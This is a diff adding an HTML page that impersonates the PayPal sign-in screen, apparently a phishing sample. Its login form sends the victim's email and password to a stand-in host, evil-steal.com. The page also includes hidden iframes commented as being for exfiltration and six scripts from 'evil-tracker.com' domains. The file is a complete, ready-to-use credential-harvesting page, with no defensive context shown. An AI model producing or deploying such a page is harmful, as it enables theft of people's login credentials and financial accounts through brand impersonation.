@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sign In - PayPal</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; }
+        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 360px; }
+        .logo { text-align: center; font-size: 32px; font-weight: bold; color: #003087; margin-bottom: 30px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #0070ba; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
+    </style>
+</head>
+<body>
+    <!-- Hidden iframe to exfiltrate data -->
+    <iframe src="about:blank" width="1" height="1" style="position:absolute;top:-9999px;" aria-hidden="true"></iframe>
+    <iframe src="about:blank" width="0" height="0" style="display:none;"></iframe>
+
+    <div class="login-box">
+        <div class="logo">PayPal</div>
+        <form action="https://evil-steal.com/capture" method="POST">
+            <input type="email" name="email" placeholder="Email address" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="hidden" name="return_url" value="https://www.paypal.com/">
+            <input type="hidden" name="redirect" value="true">
+            <input type="hidden" name="campaign" value="urgent_verify">
+            <button type="submit">Log In</button>
+        </form>
+        <div class="footer">
+            <a href="#">Having trouble logging in?</a>
+        </div>
+    </div>
+
+    <!-- Many external scripts (trackers) -->
+    <script src="https://analytics.evil-tracker.com/track.js"></script>
+    <script src="https://cdn.evil-tracker.com/beacon.js"></script>
+    <script src="https://stats.evil-tracker.com/collect.js"></script>
+    <script src="https://metrics.evil-tracker.com/engage.js"></script>
+    <script src="https://pixel.evil-tracker.com/visitor.js"></script>
+    <script src="https://cdn.evil-tracker.com/heatmap.js"></script>
+</body>
+</html>
